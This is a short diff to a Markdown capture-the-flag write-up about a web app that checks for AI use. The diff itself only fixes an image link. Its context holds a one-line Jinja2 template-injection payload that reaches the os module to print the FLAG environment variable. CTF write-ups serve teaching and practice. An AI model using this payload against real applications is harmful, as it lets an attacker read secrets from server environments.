@@ -4,7 +4,7 @@
 Lately, a lot of teams have started to use AI. We built a small webapplication to check if people use it for CTFs.
 
 ## Analysis
-!(images/team-check1.png)
+![team-check1](images/team-check1.png)
 ## Payload
 ```jinja2
 {% print cycler.__init__.__globals__.os.environ['FLAG'] %}
